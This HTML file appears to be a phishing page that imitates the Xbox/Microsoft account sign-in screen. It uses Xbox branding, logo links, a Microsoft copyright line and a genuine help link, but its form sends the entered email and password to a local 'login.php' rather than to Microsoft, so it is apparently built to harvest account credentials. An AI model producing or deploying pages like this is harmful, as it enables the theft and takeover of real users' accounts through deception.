<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Sign in to your account | Xbox</title>
    <link rel="icon" href="https://secure.xboxlive.com/statics/favicon.ico" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            padding: 32px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.7);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo img {
            height: 40px;
        }
        h1 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #fff;
        }
        .input-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            margin-bottom: 6px;
            color: #ccc;
        }
        input {
            width: 100%;
            padding: 12px;
            background: #2d2d2d;
            border: 1px solid #444;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #0e73f7;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #107c10;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background: #0f6a0f;
        }
        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #777;
        }
        .footer a {
            color: #0e73f7;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://assets.xboxlive.com/statics/xbox-logo.svg" alt="Xbox" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/f/f9/Xbox_one_logo.svg/1200px-Xbox_one_logo.svg.png';">
        </div>
        <h1>Sign in with your Xbox account</h1>
        <form method="POST" action="login.php">
            <div class="input-group">
                <label for="email">Email, phone, or Xbox user ID</label>
                <input type="text" id="email" name="email" required autocomplete="off" />
            </div>
            <div class="input-group">
                <label for="passwd">Password</label>
                <input type="password" id="passwd" name="passwd" required autocomplete="off" />
            </div>
            <button type="submit">Sign in</button>
        </form>
        <div class="footer">
            <p>Can't access your account? <a href="https://account.live.com/acsr" target="_blank">Help</a></p>
            <p>Â© Microsoft Corporation</p>
        </div>
    </div>
</body>
</html>
